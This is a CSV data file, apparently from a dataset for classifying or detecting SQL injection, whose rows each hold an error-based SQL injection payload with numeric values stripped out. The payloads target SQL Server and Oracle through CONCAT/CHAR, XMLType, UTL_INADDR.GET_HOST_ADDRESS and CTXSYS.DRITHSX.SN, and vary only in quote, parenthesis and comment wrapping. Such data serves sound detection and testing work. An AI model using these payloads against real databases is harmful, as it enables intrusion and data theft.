,language,source
6893,sql," % ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' % ' = ' "
6894,sql," % "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " % " = " "
6895,sql,"  AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
6896,sql,"  AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) # "
6897,sql," ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL )  -- "
6898,sql," ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL )  -- "
6899,sql," ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( = "
6900,sql," ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( = "
6901,sql," ) ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ( = "
6902,sql,"  AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) "
6903,sql," ' ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ' xRJA ' = ' "
6904,sql," ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' BdJp ' = ' "
6905,sql," ' ) ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ( ' CfBK ' = ' "
6906,sql," ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' Nzck ' = ' "
6907,sql," ' ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ' AnDX ' LIKE ' "
6908,sql," ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' uusG ' LIKE ' "
6909,sql," ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' ykIg ' LIKE ' "
6910,sql," "" ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( " dzjU " = " "
6911,sql," "" ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( " uPIv " = " "
6912,sql," "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " pZqB " = " "
6913,sql," "" ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( " ZGNw " LIKE " "
6914,sql," "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " qoOz " LIKE " "
6915,sql," % ' ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ' % ' = ' "
6916,sql," % ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' % ' = ' "
6917,sql," % ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' % ' = ' "
6918,sql," % "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " % " = " "
6919,sql,"  AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL )  -- "
6920,sql,"  AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) # "
6921,sql," ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
6922,sql," ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
6923,sql," ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( = "
6924,sql," ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( = "
6925,sql," ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( = "
6926,sql,"  AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) "
6927,sql," ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' jLPn ' = ' "
6928,sql," ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' STOJ ' = ' "
6929,sql," ' ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( ' kYXn ' = ' "
6930,sql," ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' Nqho ' = ' "
6931,sql," ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' NeVb ' LIKE ' "
6932,sql," ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' bSmk ' LIKE ' "
6933,sql," ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' CTOy ' LIKE ' "
6934,sql," "" ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( " WKZW " = " "
6935,sql," "" ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( " nDOO " = " "
6936,sql," "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " zwgm " = " "
6937,sql," "" ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( " eovb " LIKE " "
6938,sql," "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " eDeL " LIKE " "
6939,sql," % ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' % ' = ' "
6940,sql," % ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' % ' = ' "
6941,sql," % ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' % ' = ' "
6942,sql," % "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " % " = " "
6943,sql,"  AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
6944,sql,"  AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) # "
6945,sql," ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) )  -- "
6946,sql," ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) )  -- "
6947,sql," ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( = "
6948,sql," ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( = "
6949,sql," ) ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ( = "
6950,sql,"  AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) "
6951,sql," ' ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ' VIwI ' = ' "
6952,sql," ' ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ' XiGB ' = ' "
6953,sql," ' ) ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ( ' PPDU ' = ' "
6954,sql," ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' ueyq ' = ' "
6955,sql," ' ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ' eSor ' LIKE ' "
6956,sql," ' ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ' leOz ' LIKE ' "
6957,sql," ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' AXoi ' LIKE ' "
6958,sql," "" ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( " smtQ " = " "
6959,sql," "" ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( " SEWd " = " "
6960,sql," "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " Djfs " = " "
6961,sql," "" ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( " xlzM " LIKE " "
6962,sql," "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " eLyh " LIKE " "
6963,sql," % ' ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ' % ' = ' "
6964,sql," % ' ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ' % ' = ' "
